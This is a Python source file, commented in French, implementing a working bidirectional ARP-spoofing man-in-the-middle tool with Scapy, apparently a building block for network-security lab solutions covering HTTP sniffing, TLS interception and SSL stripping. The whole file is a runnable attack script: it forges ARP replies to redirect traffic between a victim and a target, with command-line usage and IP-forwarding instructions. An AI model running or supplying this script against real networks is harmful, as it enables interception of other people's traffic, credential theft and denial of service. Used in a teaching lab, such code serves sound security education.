#!/usr/bin/env python3
"""
Primitive MITM en Scapy — empoisonnement ARP bidirectionnel.

Sert de brique de base à plusieurs corrections « avec Scapy » :
  - C3 MITM HTTP  : redirige victime↔cible pour renifler le flux clair ;
  - C4/C6 (self-signed, ssl-strip) : place l'attaquant sur le chemin avant de
    dérouler l'interception TLS/le stripping avec un proxy dédié.

Principe : on annonce à la VICTIME que l'IP de la CIBLE est à NOTRE adresse MAC,
et réciproquement (ARP « is-at » mensongers, RFC 826). Il faut activer le
routage IP (net.ipv4.ip_forward=1) pour relayer le trafic, sinon on réalise un
déni de service au lieu d'une interception.

  sudo sysctl -w net.ipv4.ip_forward=1
  sudo python3 arp_spoof.py --victim 172.28.0.11 --target 172.28.0.23 --iface eth0

À l'arrêt (Ctrl-C), les tables ARP légitimes sont restaurées.
"""
import argparse
import sys
import time

from scapy.all import ARP, Ether, get_if_hwaddr, getmacbyip, send, srp  # type: ignore


def _mac(ip: str, iface: str) -> str:
    mac = getmacbyip(ip)
    if mac:
        return mac
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=3, retry=2, iface=iface, verbose=False,
    )
    for _, rcv in ans:
        return rcv[Ether].src
    print(f"[!] MAC introuvable pour {ip}", file=sys.stderr)
    sys.exit(1)


def poison(victim, target, vmac, tmac, attacker_mac) -> None:
    # À la victime : « target est à MOI » ; à la cible : « victim est à MOI ».
    send(ARP(op=2, pdst=victim, hwdst=vmac, psrc=target, hwsrc=attacker_mac), verbose=False)
    send(ARP(op=2, pdst=target, hwdst=tmac, psrc=victim, hwsrc=attacker_mac), verbose=False)


def restore(victim, target, vmac, tmac) -> None:
    # Rétablit les associations réelles (5 rafales pour convergence).
    for _ in range(5):
        send(ARP(op=2, pdst=victim, hwdst=vmac, psrc=target, hwsrc=tmac), verbose=False)
        send(ARP(op=2, pdst=target, hwdst=tmac, psrc=victim, hwsrc=vmac), verbose=False)


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--victim", required=True)
    ap.add_argument("--target", required=True)
    ap.add_argument("--iface", required=True)
    ap.add_argument("--interval", type=float, default=2.0)
    a = ap.parse_args()

    attacker_mac = get_if_hwaddr(a.iface)
    vmac, tmac = _mac(a.victim, a.iface), _mac(a.target, a.iface)
    print(f"[*] victime {a.victim}={vmac}  cible {a.target}={tmac}  moi={attacker_mac}")
    print("[*] empoisonnement en cours (Ctrl-C pour restaurer)…")
    try:
        while True:
            poison(a.victim, a.target, vmac, tmac, attacker_mac)
            time.sleep(a.interval)
    except KeyboardInterrupt:
        print("\n[*] restauration des tables ARP…")
        restore(a.victim, a.target, vmac, tmac)


if __name__ == "__main__":
    main()
